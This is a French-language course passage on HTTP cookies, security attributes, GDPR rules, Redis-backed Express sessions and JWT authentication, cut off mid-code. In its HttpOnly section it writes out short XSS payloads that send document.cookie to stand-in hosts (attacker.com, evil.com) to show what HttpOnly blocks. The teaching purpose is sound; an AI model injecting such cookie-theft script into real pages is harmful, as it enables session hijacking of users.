# Cookies et Gestion de Session

Les cookies et la gestion de session sont des mécanismes fondamentaux du Web qui permettent de maintenir un état entre le navigateur et le serveur, dans un protocole HTTP qui est intrinsèquement **sans état** (*stateless*). Ce cours couvre l'ensemble de la chaîne : création et sécurisation des cookies, implémentation de sessions côté serveur avec Redis, authentification sans état par JWT, et toutes les attaques classiques avec leurs contre-mesures.

> [!info] Prérequis
> Ce cours suppose que tu maîtrises HTTP (requêtes, réponses, headers), JavaScript ES6+, Node.js et Express.js de base. Relis **02 - Nodejs Fondamentaux** et **01 - Express.js et NestJS** si nécessaire avant d'attaquer les sections 9 et 10.

---

## 1. Les Cookies — Définition et Cycle de Vie

### 1.1 Qu'est-ce qu'un cookie ?

Un **cookie** est un petit fragment de données qu'un serveur HTTP envoie au navigateur, et que ce navigateur renvoie automatiquement à ce même serveur à chaque requête ultérieure vers le même domaine. C'est le seul mécanisme natif du protocole HTTP pour qu'un serveur "reconnaisse" un client d'une requête à l'autre.

```
Client (Navigateur)                          Serveur
        |                                        |
        |  GET /login  HTTP/1.1                  |
        | -------------------------------------> |
        |                                        |
        |  HTTP/1.1 200 OK                       |
        |  Set-Cookie: session_id=abc123         |
        | <------------------------------------- |
        |                                        |
        |  GET /dashboard  HTTP/1.1              |
        |  Cookie: session_id=abc123             |
        | -------------------------------------> |  ← automatique !
        |                                        |
        |  HTTP/1.1 200 OK                       |
        | <------------------------------------- |
```

Le navigateur stocke les cookies dans une base locale et les attache automatiquement aux requêtes qui correspondent aux critères du cookie (domaine, chemin, schéma).

### 1.2 Le header HTTP Set-Cookie

Le serveur crée un cookie en envoyant un header `Set-Cookie` dans sa réponse HTTP :

```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: username=alice; Max-Age=3600; Path=/; Secure; HttpOnly; SameSite=Strict
```

Un header `Set-Cookie` complet peut contenir :

| Composant | Rôle | Exemple |
|---|---|---|
| `name=value` | La donnée elle-même | `session_id=abc123` |
| `Max-Age` | Durée de vie en secondes | `Max-Age=86400` |
| `Expires` | Date d'expiration absolue | `Expires=Thu, 01 Jan 2026 00:00:00 GMT` |
| `Domain` | Domaine autorisé | `Domain=example.com` |
| `Path` | Chemin autorisé | `Path=/api` |
| `Secure` | HTTPS uniquement | `Secure` |
| `HttpOnly` | Inaccessible au JS | `HttpOnly` |
| `SameSite` | Politique cross-site | `SameSite=Strict` |

Pour poser **plusieurs cookies** en une seule réponse, il faut envoyer plusieurs headers `Set-Cookie` séparés — il est impossible de les fusionner sur une seule ligne.

```http
HTTP/1.1 200 OK
Set-Cookie: user_id=42; HttpOnly; Secure
Set-Cookie: theme=dark; Max-Age=31536000; SameSite=Lax
```

### 1.3 Cycle de vie d'un cookie

```
┌─────────────────────────────────────────────────────────┐
│                    CYCLE DE VIE                         │
│                                                         │
│  1. Création     → Serveur envoie Set-Cookie            │
│  2. Stockage     → Navigateur enregistre le cookie      │
│  3. Transmission → Navigateur joint Cookie: à chaque    │
│                    requête vers le bon domaine/path      │
│  4. Suppression  → Max-Age=0 | Expires passée |        │
│                    fermeture navigateur (session)        │
└─────────────────────────────────────────────────────────┘
```

> [!warning] Limite de taille
> Un cookie est limité à **4 096 octets** (clé + valeur + attributs). Dépasser cette limite est silencieusement ignoré par certains navigateurs — le cookie n'est pas créé. Ne jamais stocker de données volumineuses directement dans un cookie.

---

## 2. L'API document.cookie

### 2.1 Lire les cookies

En JavaScript côté navigateur, `document.cookie` retourne une **chaîne unique** contenant tous les cookies non-HttpOnly du document courant, séparés par `; ` :

```js
// Affiche : "username=alice; theme=dark; cart_items=3"
console.log(document.cookie);
```

Pour lire un cookie spécifique, il faut parser cette chaîne :

```js
/**
 * Lit la valeur d'un cookie par son nom.
 * @param {string} name - Nom du cookie à lire
 * @returns {string|null} - Valeur décodée ou null si absent
 */
function getCookie(name) {
  const cookies = document.cookie.split('; ');
  
  for (const cookie of cookies) {
    const [cookieName, ...cookieValueParts] = cookie.split('=');
    
    if (decodeURIComponent(cookieName) === name) {
      // On rejoint les parties au cas où la valeur contient des '='
      return decodeURIComponent(cookieValueParts.join('='));
    }
  }
  
  return null;
}

// Utilisation
const username = getCookie('username'); // "alice"
const missing  = getCookie('unknown');  // null
```

### 2.2 Écrire un cookie

L'écriture se fait en assignant une chaîne formatée à `document.cookie`. Contrairement à ce qu'on pourrait croire, cette assignation **ajoute ou modifie** un cookie, elle ne remplace pas tous les cookies :

```js
/**
 * Crée ou met à jour un cookie.
 * @param {string} name - Nom du cookie
 * @param {string} value - Valeur du cookie
 * @param {Object} options - Options (days, path, secure, sameSite)
 */
function setCookie(name, value, options = {}) {
  const {
    days    = null,
    path    = '/',
    secure  = false,
    sameSite = 'Lax'
  } = options;

  let cookieString = `${encodeURIComponent(name)}=${encodeURIComponent(value)}`;

  if (days !== null) {
    const maxAge = days * 24 * 60 * 60; // conversion en secondes
    cookieString += `; Max-Age=${maxAge}`;
  }

  cookieString += `; Path=${path}`;
  cookieString += `; SameSite=${sameSite}`;

  if (secure) {
    cookieString += '; Secure';
  }

  document.cookie = cookieString;
}

// Exemples d'utilisation
setCookie('theme', 'dark', { days: 365, sameSite: 'Lax' });
setCookie('session_token', 'xyz789', { secure: true, sameSite: 'Strict' });
```

> [!warning] Encodage obligatoire
> Toujours encoder le nom et la valeur avec `encodeURIComponent()`. Les caractères comme `=`, `;`, `,`, espace sont des délimiteurs dans la syntaxe des cookies — sans encodage, ton cookie sera corrompu ou ignoré.

### 2.3 Supprimer un cookie

On ne peut pas "supprimer" un cookie directement. On le **remplace** avec une date d'expiration dans le passé ou un `Max-Age=0` :

```js
/**
 * Supprime un cookie en fixant son expiration dans le passé.
 * @param {string} name - Nom du cookie à supprimer
 * @param {string} path - Path du cookie (doit correspondre exactement)
 */
function deleteCookie(name, path = '/') {
  // Max-Age=0 supprime immédiatement
  document.cookie = `${encodeURIComponent(name)}=; Max-Age=0; Path=${path}`;
  
  // Alternative avec Expires passée
  // document.cookie = `${encodeURIComponent(name)}=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Path=${path}`;
}

deleteCookie('theme');
deleteCookie('session_token');
```

> [!warning] Le `Path` doit correspondre
> Pour supprimer un cookie, le `Path` passé à la suppression doit être **identique** à celui utilisé lors de la création. Si tu as créé un cookie avec `Path=/api` et que tu essaies de le supprimer avec `Path=/`, l'opération échouera silencieusement.

---

## 3. Attributs de Sécurité

### 3.1 Secure — HTTPS uniquement

L'attribut `Secure` indique au navigateur de n'envoyer ce cookie que sur des connexions **HTTPS chiffrées**. Sur une connexion HTTP en clair, le cookie est ignoré.

```http
Set-Cookie: session_id=abc123; Secure
```

```
HTTP (non chiffré)  →  Cookie session_id NON envoyé  ❌
HTTPS (chiffré)     →  Cookie session_id envoyé      ✅
```

> [!warning] Localhost est une exception
> Sur `localhost`, les navigateurs envoient les cookies `Secure` même en HTTP. Ce comportement facilite le développement local mais ne doit pas faire croire que `Secure` est superflu en production.

### 3.2 HttpOnly — Protection contre le XSS

L'attribut `HttpOnly` rend le cookie **inaccessible depuis JavaScript**. `document.cookie` ne le listera jamais, et aucun script ne pourra l'exfiltrer.

```http
Set-Cookie: session_id=abc123; HttpOnly
```

```js
// Avec HttpOnly, ce cookie n'apparaît PAS ici
console.log(document.cookie); // ""

// Une attaque XSS qui tenterait ceci échouerait
document.location = 'https://attacker.com/steal?c=' + document.cookie; // "c="
```

**Pourquoi c'est critique :** une attaque XSS (*Cross-Site Scripting*) injecte du JavaScript dans ta page. Sans `HttpOnly`, ce script peut voler tous les cookies de session et usurper l'identité de l'utilisateur. Avec `HttpOnly`, le cookie est envoyé automatiquement par le navigateur mais reste invisible au code JavaScript — l'attaque est neutralisée.

```
Sans HttpOnly :
  XSS injecte fetch('https://evil.com/?c=' + document.cookie)
  → session_id volé ✅ (pour l'attaquant)

Avec HttpOnly :
  XSS injecte fetch('https://evil.com/?c=' + document.cookie)
  → document.cookie = "" (session_id absent)
  → Rien volé ✅ (pour le défenseur)
```

### 3.3 SameSite — Protection contre le CSRF

L'attribut `SameSite` contrôle si le cookie est envoyé lors des requêtes **cross-site** (initiées depuis un autre domaine). Il existe trois valeurs :

#### SameSite=Strict

Le cookie n'est jamais envoyé lors de requêtes cross-site, quelle que soit leur nature.

```http
Set-Cookie: session_id=abc123; SameSite=Strict
```

```
Navigateur sur example.com → requête vers example.com    : Cookie envoyé ✅
Navigateur sur evil.com    → requête vers example.com    : Cookie NON envoyé ❌
Clic sur lien externe      → arrive sur example.com       : Cookie NON envoyé ❌ (!)
```

> [!warning] Strict casse la navigation externe
> Si un utilisateur clique sur un lien vers ton site depuis un email ou un autre site, il arrivera **déconnecté** car le cookie de session n'est pas envoyé. Strict est adapté aux pages d'administration, pas aux sites publics.

#### SameSite=Lax (valeur par défaut moderne)

Le cookie est envoyé pour les navigations de niveau supérieur (clics sur liens `<a>`, navigations directes) mais pas pour les requêtes sous-ressources cross-site (images, iframes, fetch, XHR).

```http
Set-Cookie: session_id=abc123; SameSite=Lax
```

```
Clic sur <a href="example.com">         : Cookie envoyé ✅
Navigation directe dans la barre d'URL  : Cookie envoyé ✅
<img src="example.com/api">             : Cookie NON envoyé ❌
fetch('https://example.com/api')        : Cookie NON envoyé ❌
<form method="GET" action="...">        : Cookie envoyé ✅
<form method="POST" action="...">       : Cookie NON envoyé ❌  ← protection CSRF !
```

**Lax est le meilleur équilibre** pour la plupart des applications Web : l'utilisateur reste connecté quand il navigue normalement, mais les attaques CSRF via formulaires POST cross-site sont bloquées.

#### SameSite=None

Le cookie est envoyé dans tous les contextes, y compris cross-site. **Requiert `Secure`** obligatoirement.

```http
Set-Cookie: tracking_id=xyz; SameSite=None; Secure
```

Utilisé pour : widgets embarqués, iframes cross-origin, APIs appelées depuis d'autres domaines (OAuth, pixels de tracking).

#### Tableau récapitulatif SameSite

| Scénario | Strict | Lax | None |
|---|---|---|---|
| Navigation directe vers le site | ✅ | ✅ | ✅ |
| Clic depuis un lien externe | ❌ | ✅ | ✅ |
| POST form cross-site | ❌ | ❌ | ✅ |
| fetch/XHR cross-site | ❌ | ❌ | ✅ |
| Image cross-site | ❌ | ❌ | ✅ |
| Protection CSRF | ✅✅ | ✅ | ❌ |

### 3.4 Domain et Path — Portée du cookie

**Domain** définit pour quels domaines le cookie est envoyé :

```http
# Envoyé à example.com et tous ses sous-domaines
Set-Cookie: prefs=dark; Domain=example.com

# Envoyé uniquement au domaine exact (comportement par défaut sans Domain)
Set-Cookie: session=abc; # → uniquement sub.example.com si émis par sub.example.com
```

> [!info] Comportement par défaut
> Sans `Domain`, le cookie est limité au domaine **exact** qui l'a émis, sous-domaines exclus. Avec `Domain=example.com`, le cookie s'applique à `example.com`, `www.example.com`, `api.example.com`, etc.

**Path** limite l'envoi du cookie aux URLs commençant par ce chemin :

```http
Set-Cookie: admin_token=xyz; Path=/admin
```

```
GET /admin/users    → Cookie envoyé ✅
GET /admin/settings → Cookie envoyé ✅
GET /               → Cookie NON envoyé ❌
GET /api/data       → Cookie NON envoyé ❌
```

### 3.5 Max-Age et Expires

```http
# Max-Age : durée en secondes depuis maintenant
Set-Cookie: prefs=dark; Max-Age=86400        # 1 jour
Set-Cookie: session=abc; Max-Age=0           # Suppression immédiate

# Expires : date absolue UTC
Set-Cookie: prefs=dark; Expires=Fri, 01 Jan 2027 00:00:00 GMT
```

> [!tip] Préférer Max-Age à Expires
> `Max-Age` est relatif à l'horloge du serveur, `Expires` est absolu. Si l'horloge du client est déréglée, `Expires` peut se comporter de façon inattendue. `Max-Age` est supporté par tous les navigateurs modernes et est plus prévisible.

---

## 4. Cookies de Session vs Cookies Persistants

### 4.1 Cookie de session

Un cookie **sans** `Max-Age` ni `Expires` est un cookie de session. Il vit dans la mémoire du navigateur et est supprimé dès que toutes les fenêtres du navigateur sont fermées.

```http
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Lax
# → Disparaît à la fermeture du navigateur
```

### 4.2 Cookie persistant

Un cookie avec `Max-Age` ou `Expires` est **persistant** — il survit aux redémarrages du navigateur jusqu'à l'expiration définie.

```http
Set-Cookie: remember_token=xyz789; Max-Age=2592000; HttpOnly; Secure; SameSite=Lax
# Max-Age=2592000 = 30 jours
# → Persiste sur disque, survit aux redémarrages
```

| Caractéristique | Cookie de Session | Cookie Persistant |
|---|---|---|
| Stockage | Mémoire RAM | Disque |
| Durée de vie | Jusqu'à fermeture navigateur | Jusqu'à l'expiration |
| Attribut requis | Aucun (absence = session) | `Max-Age` ou `Expires` |
| Usage typique | Session d'authentification | "Se souvenir de moi", préférences |
| Sécurité | Plus sûr | Risque de vol sur poste partagé |

> [!tip] "Se souvenir de moi"
> Le bouton "Se souvenir de moi" d'un formulaire de login change généralement le cookie de session en cookie persistant de 30 jours. Sans cette case, la session s'arrête à la fermeture du navigateur.

---

## 5. Cookies Tiers, Tracking et Réglementation

### 5.1 Cookies first-party vs third-party

- **First-party** : émis par le domaine que l'utilisateur visite. `example.com` pose un cookie → navigateur le renvoie à `example.com`.
- **Third-party** : émis par un domaine différent de celui visité. Une image chargée depuis `tracker.com` sur `example.com` permet à `tracker.com` de poser un cookie.

```html
<!-- Sur example.com : cette image charge depuis tracker.com -->
<img src="https://tracker.com/pixel.gif?ref=example.com" width="1" height="1">
<!-- tracker.com peut répondre avec Set-Cookie: uid=xyz; SameSite=None; Secure -->
<!-- Ce cookie sera renvoyé à tracker.com sur TOUS les sites qui chargent cette image -->
```

Ce mécanisme permet de tracer un utilisateur sur des milliers de sites sans qu'il le sache.

### 5.2 Réglementation RGPD et ePrivacy

**RGPD (Règlement Général sur la Protection des Données)** et la directive **ePrivacy** (en cours de révision en règlement) encadrent l'utilisation des cookies dans l'Union Européenne.

**Principe clé : consentement préalable libre, éclairé, spécifique**

```
Cookies EXEMPTÉS (pas de consentement requis) :
  ├── Cookies strictement nécessaires au service demandé
  │   (session d'authentification, panier e-commerce)
  ├── Cookies de préférences techniques (langue, thème)
  └── Cookies de sécurité (anti-CSRF, anti-fraude)

Cookies SOUMIS au consentement :
  ├── Cookies analytiques (Google Analytics, Matomo)
  ├── Cookies publicitaires / retargeting
  ├── Cookies de réseaux sociaux (boutons Like, partage)
  └── Tous les cookies tiers de tracking
```

**Obligations techniques pour la bannière de consentement :**

1. Proposer le refus aussi facilement que l'acceptation
2. Ne pas déposer de cookies soumis au consentement **avant** que celui-ci soit donné
3. Conserver une preuve du consentement (date, version de la politique, choix)
4. Permettre le retrait du consentement à tout moment

> [!warning] Pratiques illégales courantes
> - Pré-cocher les cases de cookies non-essentiels
> - Bouton "Accepter tout" visible, refus caché dans un sous-menu
> - Déposer des cookies analytiques avant le consentement
> - Continuer à utiliser des données après retrait du consentement

### 5.3 La fin progressive des cookies tiers

Les principaux navigateurs bloquent ou vont bloquer les cookies tiers par défaut :

| Navigateur | Statut cookies tiers |
|---|---|
| Safari | Bloqués par défaut depuis 2017 (ITP) |
| Firefox | Bloqués par défaut depuis 2019 (ETP) |
| Chrome | Blocage progressif depuis 2024 |
| Edge | Suit Chrome |

Les alternatives émergentes (Privacy Sandbox, Topics API, FLEDGE) tentent de permettre la publicité ciblée sans tracking individuel cross-site.

---

## 6. Sessions Côté Serveur

### 6.1 Principe fondamental

Une **session côté serveur** stocke les données de l'utilisateur **sur le serveur**, et n'envoie au client qu'un identifiant opaque — le **session ID**.

```
┌─────────────────────────────────────────────────────────────────┐
│                    SESSION CÔTÉ SERVEUR                         │
│                                                                 │
│  Client                          Serveur                        │
│  ──────                          ───────                        │
│                                                                 │
│  POST /login                                                    │
│  ─────────────────────────────>                                 │
│                                  1. Vérifie credentials         │
│                                  2. Crée session :              │
│                                     {                           │
│                                       id: "a3f9b2c1",          │
│                                       userId: 42,              │
│                                       role: "admin",           │
│                                       createdAt: "2025-01-01"  │
│                                     }                           │
│                                  3. Stocke en Redis/DB         │
│                                  4. Répond avec Set-Cookie      │
│  <─────────────────────────────                                 │
│  Set-Cookie: sid=a3f9b2c1; HttpOnly; Secure                    │
│                                                                 │
│  GET /dashboard                                                 │
│  Cookie: sid=a3f9b2c1                                           │
│  ─────────────────────────────>                                 │
│                                  5. Cherche "a3f9b2c1" en Redis │
│                                  6. Trouve la session → OK      │
│  <─────────────────────────────                                 │
│  200 OK + données utilisateur                                   │
└─────────────────────────────────────────────────────────────────┘
```

### 6.2 Stockage des sessions

**Mémoire (in-process)** — simple mais problématique en production :

```js
// MemoryStore : sessions perdues au redémarrage, pas compatible multi-serveurs
const sessions = new Map();
sessions.set('a3f9b2c1', { userId: 42, role: 'admin' });
```

**Redis** — solution recommandée pour la production :

```
Avantages Redis :
  ✅ TTL natif (expiration automatique)
  ✅ Très rapide (in-memory, < 1ms)
  ✅ Partagé entre plusieurs processus/serveurs
  ✅ Survie aux redémarrages de l'application
  ✅ Scalable horizontalement
```

**Base de données SQL** — pour les besoins d'audit ou de persistance longue :

```sql
CREATE TABLE sessions (
  session_id   VARCHAR(128) PRIMARY KEY,
  user_id      INTEGER NOT NULL,
  data         JSONB,
  created_at   TIMESTAMP DEFAULT NOW(),
  expires_at   TIMESTAMP NOT NULL,
  ip_address   INET,
  user_agent   TEXT
);

-- Index TTL simulé
CREATE INDEX idx_sessions_expires ON sessions (expires_at);
-- Purge périodique : DELETE FROM sessions WHERE expires_at < NOW();
```

### 6.3 Session ID — propriétés de sécurité

Un bon session ID doit être :

- **Aléatoire** : généré avec un CSPRNG (Cryptographically Secure Pseudo-Random Number Generator)
- **Long** : au moins 128 bits (32 caractères hexadécimaux)
- **Opaque** : ne pas contenir d'information sur l'utilisateur
- **Unique** : collision quasiment impossible

```js
// Node.js — génération d'un session ID sécurisé
const crypto = require('crypto');

// 32 bytes = 256 bits → représenté en 64 caractères hex
const sessionId = crypto.randomBytes(32).toString('hex');
// Exemple : "a3f9b2c1e4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0"
```

---

## 7. Sessions Côté Client — JWT

### 7.1 Concept

Un **JWT (JSON Web Token)** est un jeton **auto-porteur** (*self-contained*) : toutes les informations nécessaires à l'authentification sont encodées dans le jeton lui-même, signé cryptographiquement. Le serveur n'a pas besoin de chercher dans une base de données.

```
Sessions serveur :  Client envoie ID → Serveur cherche dans Redis → Données
JWT :               Client envoie JWT → Serveur vérifie signature → Données (dans le JWT lui-même)
```

### 7.2 Structure d'un JWT

Un JWT est composé de trois parties encodées en **Base64URL**, séparées par des points :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQyLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDAwMDAwMDAsImV4cCI6MTcwMDA4NjQwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
│─────────────────────────────────────│─────────────────────────────────────────────────────────│──────────────────────────────────────────────│
              HEADER                                      PAYLOAD                                              SIGNATURE
```

#### Header

Identifie l'algorithme de signature utilisé :

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Encodé en Base64URL → `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`

#### Payload (Claims)

Contient les données (*claims*). Il existe des claims standardisés (RFC 7519) :

```json
{
  "iss": "https://auth.example.com",   // Issuer — qui a émis le token
  "sub": "user:42",                    // Subject — identifiant du sujet
  "aud": "https://api.example.com",    // Audience — destinataire prévu
  "exp": 1700086400,                   // Expiration Time (timestamp Unix)
  "iat": 1700000000,                   // Issued At (timestamp Unix)
  "jti": "a3f9b2c1-...",              // JWT ID — identifiant unique du token
  
  // Claims personnalisés
  "userId": 42,
  "role":   "admin",
  "email":  "alice@example.com"
}
```

> [!warning] Le payload n'est PAS chiffré
> Base64URL est un encodage, pas un chiffrement. **Tout le monde peut lire le payload** d'un JWT sans connaître la clé secrète. Ne jamais mettre de données sensibles (mot de passe, numéro de carte) dans un JWT. Si tu as besoin de confidentialité, utilise JWE (JWT chiffré).

#### Signature

La signature garantit l'**intégrité** du token : si un attaquant modifie le payload, la signature devient invalide.

```
HMAC-SHA256(
  Base64URL(header) + "." + Base64URL(payload),
  SECRET_KEY
)
```

### 7.3 Algorithmes de signature

| Algorithme | Type | Clé | Usage |
|---|---|---|---|
| **HS256** | HMAC-SHA256 | Symétrique (partagée) | Service unique, clé secrète partagée |
| **HS384** | HMAC-SHA384 | Symétrique | Idem, empreinte plus longue |
| **HS512** | HMAC-SHA512 | Symétrique | Idem, empreinte encore plus longue |
| **RS256** | RSA-SHA256 | Asymétrique (public/privé) | Multi-services, clé publique partageable |
| **ES256** | ECDSA-SHA256 | Asymétrique (plus compact) | Mobile, performance critique |

```
HS256 (symétrique) :
  ┌────────────────┐     Clé secrète     ┌────────────────┐
  │  Auth Service  │ ◄──────────────────► │   API Service  │
  │   (signe)      │   partagée entre     │   (vérifie)    │
  └────────────────┘    tous les services └────────────────┘
  ⚠️  Si la clé fuite, tous les services sont compromis

RS256 (asymétrique) :
  ┌────────────────┐  Clé PRIVÉE  ┌────────────────┐  Clé PUBLIQUE  ┌────────────────┐
  │  Auth Service  │ ───────────► │   Token signé  │ ─────────────► │   API Service  │
  │   (signe)      │              └────────────────┘                │   (vérifie)    │
  └────────────────┘                                                 └────────────────┘
  ✅  API Services n'ont besoin que de la clé publique (non secrète)
```

### 7.4 Avantages et inconvénients des JWT

**Avantages :**

| Avantage | Détail |
|---|---|
| Sans état | Le serveur ne stocke rien — scalabilité horizontale triviale |
| Auto-porteur | Contient les données utilisateur — évite une requête DB à chaque appel |
| Interopérable | Standard ouvert (RFC 7519), supporté dans tous les langages |
| Multi-services | Idéal pour les microservices et les architectures distribuées |

**Inconvénients :**

| Inconvénient | Détail |
|---|---|
| Révocation difficile | Un JWT valide reste valide jusqu'à expiration — impossible d'invalider un seul token sans liste de révocation (JTI blacklist) |
| Taille | Plus gros qu'un session ID (200-400 octets vs 32 octets) |
| Payload exposé | Les données sont lisibles par le client |
| Gestion des refreshs | Nécessite un mécanisme de refresh token |

> [!warning] Le piège du "logout" avec JWT
> Si tu stockes un JWT en mémoire côté client et que l'utilisateur se déconnecte, tu supprimes simplement le token du client — mais le token reste **cryptographiquement valide** jusqu'à son expiration. Si quelqu'un l'a volé, il peut continuer à l'utiliser. La solution : access tokens de courte durée (15 min) + refresh tokens révocables.

---

## 8. JWT en Détail — Implémentation Node.js

### 8.1 Installation

```bash
npm install jsonwebtoken
npm install --save-dev @types/jsonwebtoken  # Pour TypeScript
```

### 8.2 Générer un token

```js
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// En production : stocker cette clé dans une variable d'environnement
// Générer une clé sécurisée : node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
const SECRET_KEY = process.env.JWT_SECRET || 'CHANGE_ME_IN_PRODUCTION';

/**
 * Génère un access token JWT (courte durée).
 * @param {Object} user - Objet utilisateur (depuis la DB)
 * @returns {string} - JWT signé
 */
function generateAccessToken(user) {
  const payload = {
    userId : user.id,
    email  : user.email,
    role   : user.role,
    // jti unique pour permettre la révocation si nécessaire
    jti    : crypto.randomUUID(),
  };

  return jwt.sign(payload, SECRET_KEY, {
    algorithm : 'HS256',
    expiresIn : '15m',        // Access token : courte durée
    issuer    : 'example.com',
    audience  : 'example.com',
  });
}

/**
 * Génère un refresh token (longue durée, stocké en DB).
 * @param {number} userId
 * @returns {string}
 */
function generateRefreshToken(userId) {
  return jwt.sign(
    { userId, jti: crypto.randomUUID(), type: 'refresh' },
    SECRET_KEY,
    { expiresIn: '30d' }
  );
}

// Exemple d'utilisation
const user = { id: 42, email: 'alice@example.com', role: 'admin' };
const accessToken  = generateAccessToken(user);
const refreshToken = generateRefreshToken(user.id);

console.log('Access Token:', accessToken);
```

### 8.3 Vérifier un token

```js
/**
 * Vérifie et décode un JWT.
 * @param {string} token - JWT à vérifier
 * @returns {{ valid: true, payload: Object } | { valid: false, error: string }}
 */
function verifyToken(token) {
  try {
    const payload = jwt.verify(token, SECRET_KEY, {
      algorithms : ['HS256'],
      issuer     : 'example.com',
      audience   : 'example.com',
    });
    return { valid: true, payload };
  } catch (error) {
    // Distinguer les types d'erreur
    if (error.name === 'TokenExpiredError') {
      return { valid: false, error: 'TOKEN_EXPIRED' };
    }
    if (error.name === 'JsonWebTokenError') {
      return { valid: false, error: 'TOKEN_INVALID' };
    }
    if (error.name === 'NotBeforeError') {
      return { valid: false, error: 'TOKEN_NOT_YET_VALID' };
    }
    return { valid: false, error: 'TOKEN_UNKNOWN_ERROR' };
  }
}

// Décoder sans vérifier (lecture seule, dangereux sans vérification !)
const decoded = jwt.decode(accessToken);
console.log('Payload non vérifié:', decoded);
```

### 8.4 Middleware Express d'authentification JWT

```js
const express = require('express');

/**
 * Middleware qui extrait et vérifie le JWT depuis le header Authorization.
 * Attend : Authorization: Bearer <token>
 */
function authenticateJWT(req, res, next) {
  const authHeader = req.headers['authorization'];

  if (!authHeader) {
    return res.status(401).json({ error: 'Authorization header manquant' });
  }

  // Format attendu : "Bearer <token>"
  const [scheme, token] = authHeader.split(' ');

  if (scheme !== 'Bearer' || !token) {
    return res.status(401).json({ error: 'Format Authorization invalide. Attendu : Bearer <token>' });
  }

  const result = verifyToken(token);

  if (!result.valid) {
    const statusCode = result.error === 'TOKEN_EXPIRED' ? 401 : 403;
    return res.status(statusCode).json({ error: result.error });
  }

  // Attacher le payload décodé à la requête pour les middlewares suivants
  req.user = result.payload;
  next();
}

/**
 * Middleware de vérification de rôle (à utiliser après authenticateJWT).
 * @param {...string} roles - Rôles autorisés
 */
function requireRole(...roles) {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Non authentifié' });
    }
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({ error: `Rôle insuffisant. Requis : ${roles.join(' ou ')}` });
    }
    next();
  };
}

// Utilisation dans les routes
const app = express();
app.use(express.json());

// Route publique
app.get('/public', (req, res) => {
  res.json({ message: 'Accessible à tous' });
});

// Route protégée par JWT
app.get('/profile', authenticateJWT, (req, res) => {
  res.json({ user: req.user });
});

// Route protégée + rôle admin
app.delete('/users/:id', authenticateJWT, requireRole('admin'), (req, res) => {
  res.json({ message: `Utilisateur ${req.params.id} supprimé` });
});
```

---

## 9. Implémentation Session avec Express.js

### 9.1 Installation des dépendances

```bash
npm install express express-session connect-redis redis
npm install --save-dev @types/express-session
```

### 9.2 Configuration de base avec express-session

```js
const express      = require('express');
const session      = require('express-session');
const { createClient }  = require('redis');
const { RedisStore }    = require('connect-redis');

const app = express();

// 1. Créer et connecter le client Redis
const redisClient = createClient({
  url: process.env.REDIS_URL || 'redis://localhost:6379',
});

redisClient.on('error', (err) => console.error('Redis Client Error', err));
redisClient.on('connect', () => console.log('Redis connecté'));

// Connexion asynchrone (à faire au démarrage de l'app)
async function startServer() {
  await redisClient.connect();

  // 2. Configurer le middleware de session
  app.use(session({
    // Obligatoire : clé secrète pour signer le session ID
    secret: process.env.SESSION_SECRET || 'CHANGE_ME_IN_PRODUCTION',

    // Ne pas sauvegarder si la session n'a pas changé
    resave: false,

    // Ne pas créer de session pour les visiteurs non authentifiés
    saveUninitialized: false,

    // Utiliser Redis pour le stockage
    store: new RedisStore({ client: redisClient }),

    // Configuration du cookie de session
    cookie: {
      secure:   process.env.NODE_ENV === 'production', // HTTPS en prod
      httpOnly: true,                                   // Inaccessible au JS
      sameSite: 'lax',                                  // Protection CSRF
      maxAge:   24 * 60 * 60 * 1000,                   // 24 heures en ms
    },

    // Nom du cookie (par défaut : 'connect.sid')
    name: 'sid',
  }));

  app.use(express.json());

  // ... définir les routes

  app.listen(3000, () => console.log('Serveur démarré sur http://localhost:3000'));
}

startServer();
```

### 9.3 Routes d'authentification avec sessions

```js
const bcrypt = require('bcrypt'); // npm install bcrypt

// Base de données simulée
const users = [
  {
    id:       1,
    email:    'alice@example.com',
    // Hash de "password123" — en prod, stocker le hash en DB, jamais le mot de passe en clair
    password: '$2b$10$YoqpHoZwLJ5kG5bVrQe5meOSfRxCGYNqx2j1tP.kJ8mNUa9s0Ge7.',
    role:     'user',
  },
];

/**
 * POST /auth/login
 * Authentifie l'utilisateur et crée une session.
 */
app.post('/auth/login', async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Email et mot de passe requis' });
  }

  // Trouver l'utilisateur
  const user = users.find(u => u.email === email);
  if (!user) {
    // Même message d'erreur pour email inconnu et mot de passe incorrect
    // → Évite l'énumération d'emails
    return res.status(401).json({ error: 'Identifiants invalides' });
  }

  // Vérifier le mot de passe
  const passwordMatch = await bcrypt.compare(password, user.password);
  if (!passwordMatch) {
    return res.status(401).json({ error: 'Identifiants invalides' });
  }

  // IMPORTANT : régénérer l'ID de session après login
  // → Protection contre la session fixation (voir section 11)
  req.session.regenerate((err) => {
    if (err) {
      return res.status(500).json({ error: 'Erreur serveur' });
    }

    // Stocker les données dans la session
    req.session.userId = user.id;
    req.session.email  = user.email;
    req.session.role   = user.role;
    req.session.loginAt = new Date().toISOString();

    // Sauvegarder la session avant de répondre
    req.session.save((err) => {
      if (err) {
        return res.status(500).json({ error: 'Erreur serveur' });
      }

      res.json({
        message: 'Connexion réussie',
        user: {
          id:    user.id,
          email: user.email,
          role:  user.role,
        },
      });
    });
  });
});

/**
 * POST /auth/logout
 * Détruit la session côté serveur et supprime le cookie.
 */
app.post('/auth/logout', (req, res) => {
  // Détruire les données de session dans Redis
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({ error: 'Erreur lors de la déconnexion' });
    }

    // Supprimer le cookie côté client
    res.clearCookie('sid', {
      path: '/',
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
    });

    res.json({ message: 'Déconnexion réussie' });
  });
});

/**
 * GET /profile
